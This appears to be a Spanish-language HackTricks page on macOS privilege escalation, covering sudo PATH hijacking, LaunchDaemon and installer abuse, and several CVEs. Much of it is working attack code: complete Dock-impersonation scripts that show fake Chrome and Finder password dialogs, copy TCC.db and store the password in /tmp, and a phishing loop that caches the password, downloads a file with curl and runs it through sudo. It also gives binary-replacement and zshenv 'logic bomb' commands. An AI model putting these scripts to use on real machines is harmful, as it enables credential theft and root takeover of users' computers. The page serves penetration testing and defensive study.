# Escalada de privilegios en macOS

{{#include ../../banners/hacktricks-training.md}}

## Escalada de privilegios de TCC

Si llegaste aquí buscando cómo escalar privilegios de TCC, ve a:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Muchas técnicas de escalada de privilegios que afectan a Linux u otros sistemas similares a Unix también se aplican a macOS. Consulta:


{{#ref}}
../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
{{#endref}}

## Interacción del usuario

### Sudo Hijacking

Puedes encontrar la técnica original [Sudo Hijacking en la publicación sobre escalada de privilegios en Linux](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking).

Sin embargo, macOS **mantiene** el **`PATH`** del usuario cuando este ejecuta **`sudo`**. Esto significa que otra forma de llevar a cabo este ataque sería **secuestrar otros binarios** que la víctima todavía ejecuta al **usar sudo:**

```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
    whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```

Ten en cuenta que es muy probable que un usuario que utiliza la terminal tenga **Homebrew instalado**. Por lo tanto, es posible secuestrar ejecutables en **`/opt/homebrew/bin`**.

### Suplantación del Dock

Mediante algo de **ingeniería social**, podrías **suplantar, por ejemplo, a Google Chrome** en el Dock y, en realidad, ejecutar tu propio script:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Algunas sugerencias:

- Comprueba si hay un Chrome en el Dock y, si lo hay, **elimina** esa entrada y **añade** la entrada **falsa** de **Chrome en la misma posición** del array del Dock.

<details>
<summary>Script de suplantación de Chrome en el Dock</summary>

```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    char *cmd = "open /Applications/Google\\\\ Chrome.app & "
                "sleep 2; "
                "osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
                "PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
                "echo $PASSWORD > /tmp/passwd.txt";
    system(cmd);
    return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Google Chrome</string>
    <key>CFBundleIdentifier</key>
    <string>com.google.Chrome</string>
    <key>CFBundleName</key>
    <string>Google Chrome</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```

</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
Algunas sugerencias:

- **No puedes quitar Finder del Dock**, así que, si vas a añadirlo al Dock, puedes poner el Finder falso justo al lado del real. Para ello, debes **añadir la entrada del Finder falso al principio del array del Dock**.
- Otra opción es no colocarlo en el Dock y simplemente abrirlo; «Finder pidiendo controlar Finder» no es tan extraño.
- Otra opción para **escalar a root sin pedir** la contraseña y sin mostrar un cuadro horrible es hacer que Finder realmente pida la contraseña para realizar una acción con privilegios:
  - Pedirle a Finder que copie a **`/etc/pam.d`** un nuevo archivo **`sudo`** (el aviso que pide la contraseña indicará que «Finder quiere copiar sudo»).
  - Pedirle a Finder que copie un nuevo **Authorization Plugin** (puedes controlar el nombre del archivo para que el aviso que pide la contraseña indique que «Finder quiere copiar Finder.bundle»).

<details>
<summary>Script de suplantación del Dock de Finder</summary>

```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    char *cmd = "open /System/Library/CoreServices/Finder.app & "
                "sleep 2; "
                "osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
                "PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
                "echo $PASSWORD > /tmp/passwd.txt";
    system(cmd);
    return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Finder</string>
    <key>CFBundleIdentifier</key>
    <string>com.apple.finder</string>
    <key>CFBundleName</key>
    <string>Finder</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```

</details>

{{#endtab}}
{{#endtabs}}

### Phishing de solicitud de contraseña + reutilización de sudo

El malware suele aprovechar la interacción del usuario para **capturar una contraseña con permisos de sudo** y reutilizarla mediante programación. Un flujo habitual:

1. Identificar al usuario conectado con `whoami`.
2. **Repetir las solicitudes de contraseña** hasta que `dscl . -authonly "$user" "$pw"` devuelva éxito.
3. Guardar en caché la credencial (p. ej., en `/tmp/.pass`) y ejecutar acciones con privilegios mediante `sudo -S` (contraseña por stdin).

Ejemplo de cadena mínima:

```bash
user=$(whoami)
while true; do
  read -s -p "Password: " pw; echo
  dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```

La contraseña robada se puede reutilizar para **eliminar la cuarentena de Gatekeeper con `xattr -c`**, copiar LaunchDaemons u otros archivos privilegiados y ejecutar etapas adicionales sin interacción.<sup>[[1]](#references)</sup>

## Vectores específicos de versiones recientes de macOS (2023–2026)

### `AuthorizationExecuteWithPrivileges` obsoleto sigue siendo utilizable

`AuthorizationExecuteWithPrivileges` quedó obsoleto en la versión 10.7, pero **sigue funcionando en Sonoma/Sequoia**. Muchos actualizadores comerciales invocan `/usr/libexec/security_authtrampoline` con una ruta no confiable. Si el binario de destino permite escritura por parte del usuario, puedes instalar un troyano y aprovechar el aviso legítimo:

```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```

Combínalo con las **técnicas de suplantación anteriores** para mostrar un cuadro de diálogo de contraseña convincente.


### Evaluación inicial de helpers privilegiados / XPC

Muchas privescs modernas de terceros en macOS siguen el mismo patrón: un **LaunchDaemon de root** expone un **servicio Mach/XPC** desde **`/Library/PrivilegedHelperTools`**; luego, el helper no valida al cliente, lo valida **demasiado tarde** (PID race) o expone un **método de root** que usa una ruta o un script **controlado por el usuario**. Esta clase de vulnerabilidad está detrás de muchos bugs recientes en helpers de clientes VPN, lanzadores de juegos y actualizadores.<sup>[[2]](#references)</sup>

Lista rápida de comprobación para la evaluación inicial:

```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
  echo "== $f =="
  codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
  strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```

Presta especial atención a los helpers que:

- siguen aceptando solicitudes **después de la desinstalación** porque el job permaneció cargado en `launchd`
- ejecutan scripts o leen la configuración desde **`/Applications/...`** u otras rutas en las que pueden escribir usuarios que no son root
- se basan en una validación del peer **solo por PID** o **solo por bundle ID**, que puede ser vulnerable a una race condition

Para obtener más detalles sobre los bugs de autorización de helpers, consulta [esta página](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md).

### Herencia del entorno de scripts de PackageKit (CVE-2024-27822)

Hasta que Apple lo corrigió en **Sonoma 14.5**, **Ventura 13.6.7** y **Monterey 12.7.5**, las instalaciones iniciadas por el usuario mediante **`Installer.app`** / **`PackageKit.framework`** podían ejecutar **scripts de PKG como root dentro del entorno del usuario actual**. Esto significa que un paquete que use **`#!/bin/zsh`** cargaría el **`~/.zshenv`** del atacante y lo ejecutaría como **root** cuando la víctima instalara el paquete.<sup>[[3]](#references)</sup>

Esto resulta especialmente interesante como **logic bomb**: solo necesitas un foothold en la cuenta del usuario y un archivo de inicio del shell en el que se pueda escribir; después, esperas a que el usuario ejecute cualquier instalador vulnerable basado en **zsh**. Por lo general, esto **no** se aplica a las implementaciones de **MDM/Munki**, porque se ejecutan dentro del entorno del usuario root.<sup>[[3]](#references)</sup>

```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```

Si quieres profundizar en el abuso específico de instaladores, consulta también [esta página](macos-files-folders-and-binaries/macos-installers-abuse.md).

### Colisión del destino del instalador mediante `.localized`

Algunos instaladores de terceros registran un LaunchDaemon de root cuyo ejecutable se referencia mediante una ruta fija dentro de `/Applications/Target.app`. Si un atacante puede crear primero ese bundle con un **identificador de bundle diferente**, Installer puede conservar el señuelo y colocar la aplicación real en `/Applications/Target.localized/Target.app`. El daemon sigue apuntando a la ruta original. Por lo tanto, un ejecutable controlado por el atacante dentro del bundle señuelo puede ejecutarse después como root.<sup>[[8]](#references)</sup>

Las condiciones previas importantes son:<sup>[[8]](#references)</sup>

1. El atacante puede crear o controlar la ruta de aplicación esperada.
2. El paquete no elimina el bundle en conflicto.
3. El job privilegiado utiliza una ruta codificada dentro de ese bundle.
4. El usuario o un flujo de trabajo de MDM instala el paquete y registra el job.

Busca bundles reubicados y luego revisa los destinos de LaunchDaemon con el bucle de enumeración de la siguiente sección:<sup>[[8]](#references)</sup>

```bash
find /Applications -type d -name '*.localized' -prune -print
for app in /Applications/*.app; do
  [ -d "$app" ] && stat -f '%Su:%Sg %Sp %N' "$app"
done
```

Un instalador más seguro resuelve la ubicación final del bundle y mantiene los ejecutables privilegiados en una ubicación propiedad de root, como `/Library/PrivilegedHelperTools`. También debería verificar la propiedad y la firma de código antes de registrar o iniciar el job.<sup>[[8]](#references)</sup>

### Secuestro de un destino de LaunchDaemon modificable

Un plist de LaunchDaemon puede ser propiedad de root, mientras que su `Program` o la primera entrada de `ProgramArguments` apunta a un directorio modificable por el usuario. Comprueba la **ruta completa**, no solo los permisos del ejecutable. Si el directorio principal es modificable, un atacante puede cambiar el nombre de un ejecutable propiedad de root y crear un reemplazo en la misma ruta. El reemplazo se ejecutará como root la próxima vez que se inicie el job. Basta con reiniciar o reiniciar el servicio de forma normal. El atacante no necesita permiso para ejecutar `launchctl bootstrap` en el dominio del sistema.<sup>[[7]](#references)</sup>

Enumera primero cada destino y su directorio principal inmediato:<sup>[[7]](#references)</sup>

```bash
for p in /Library/LaunchDaemons/*.plist; do
  target=$(plutil -extract Program raw -o - "$p" 2>/dev/null)
  [ -n "$target" ] ||
    target=$(plutil -extract ProgramArguments.0 raw -o - "$p" 2>/dev/null)
  [ -n "$target" ] || continue
  printf '\n%s -> %s\n' "$p" "$target"
  ls -ld "$target" "$(dirname "$target")" 2>/dev/null
done
```

Cuando el archivo o su directorio padre tenga permisos de escritura, conserva el binario original y reemplaza la ruta por un payload ejecutable. Luego espera a que se reinicie el daemon ya cargado.<sup>[[7]](#references)</sup>

```bash
target=/path/from/the/plist
mv "$target" "$target.real"
cp /tmp/payload "$target"
chmod 755 "$target"
```

### XNU SMR credential-pointer race (CVE-2025-24118)

La ruta vulnerable `kauth_cred_proc_update` actualizaba `proc_ro.p_ucred` con la API no atómica `zalloc_ro_mut`, mientras los lectores de SMR cargaban el puntero sin usar un bloqueo. El trigger público utiliza un binario setgid preparado especialmente. Un hilo alterna entre sus ID de grupo real y efectivo mientras otro entra repetidamente en una llamada al sistema como `getgid()`.<sup>[[4]](#references)</sup>

```c
// Writer thread inside a setgid binary
while (1) {
    setgid(real_gid);
    setgid(effective_gid);
}
// Reader thread
while (1) observed_gid = getgid();
```

Trátalo como una **primitiva de race**, no como un exploit de root listo para usar. El PoC publicado demuestra un puntero de credenciales parcialmente actualizado. Suele terminar en un kernel panic. El investigador solo reprodujo la corrupción en Intel y no proporcionó un control determinista del objeto de credenciales resultante. Apple cambió la actualización por un intercambio atómico de punteros en macOS 15.3.<sup>[[4]](#references)</sup>

### Bypass de SIP mediante el Asistente de Migración ("Migraine", CVE-2023-32369)

Aunque ya tengas root, SIP sigue bloqueando las escrituras en ubicaciones del sistema. El bug **Migraine** abusa del entitlement de Migration Assistant `com.apple.rootless.install.heritable` para iniciar un proceso hijo que hereda el bypass de SIP y sobrescribe rutas protegidas (p. ej., `/System/Library/LaunchDaemons`).<sup>[[5]](#references)</sup> La cadena:

1. Obtener root en un sistema activo.
2. Activar `systemmigrationd` con un estado manipulado para ejecutar un binario controlado por el atacante.
3. Usar el entitlement heredado para modificar archivos protegidos por SIP y mantener los cambios incluso después de reiniciar.

### Contrabando de expresiones NSPredicate/XPC (clase de bugs CVE-2023-23530/23531)

Varios daemons de Apple aceptan objetos **NSPredicate** mediante XPC y solo validan el campo `expressionType`, que está controlado por el atacante. Al crear un predicate que evalúe selectores arbitrarios, puedes lograr **ejecución de código en servicios XPC con privilegios de root/system** (p. ej., `coreduetd`, `contextstored`). Si se combina con un escape inicial del sandbox de una app, permite **escalada de privilegios sin avisos al usuario**. Busca endpoints XPC que deserialicen predicates y no tengan un visitor robusto.<sup>[[6]](#references)</sup>

## TCC - Escalada de privilegios de root

### CVE-2020-9771 - Bypass de TCC mediante mount_apfs y escalada de privilegios

**Cualquier usuario** (incluso sin privilegios) puede crear y montar un snapshot de Time Machine con `-o noowners` y **acceder a TODOS los archivos** de ese snapshot, evitando las comprobaciones de propiedad del volumen activo. El único privilegio necesario es que la aplicación utilizada (como `Terminal`) tenga **Acceso total al disco** (`kTCCServiceSystemPolicyAllfiles`).

Los comandos y la explicación completa están en la página de bypasses de TCC:

{{#ref}}
macos-security-protections/macos-tcc/macos-tcc-bypasses/README.md
{{#endref}}

## Información sensible

Esto puede ser útil para escalar privilegios:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}



## References

- [1] [Pentest Partners - 2025, el año del infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [CVE-2024-30165: escalada local de privilegios en AWS Client VPN para macOS](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)
- [3] [CVE-2024-27822: escalada de privilegios en macOS PackageKit](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [4] [TRAVERTINE: CVE-2025-24118](https://jprx.io/cve-2025-24118/)
- [5] [Microsoft "Migraine": bypass de SIP (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [6] [Trellix Advanced Research Center - Una nueva clase de bugs de escalada de privilegios en macOS e iOS (CVE-2023-23530/23531)](https://www.trellix.com/en-sg/blogs/research/trellix-advanced-research-center-discovers-a-new-privilege-escalation-bug-class-on-macos-and-ios/)
- [7] [Secuestro de LaunchDaemon: escalada de privilegios y persistencia mediante permisos inseguros en carpetas](https://bradleyjkemp.dev/post/launchdaemon-hijacking/)
- [8] [LPE en macOS mediante el directorio .localized](https://theevilbit.github.io/posts/localized/)
{{#include ../../banners/hacktricks-training.md}}
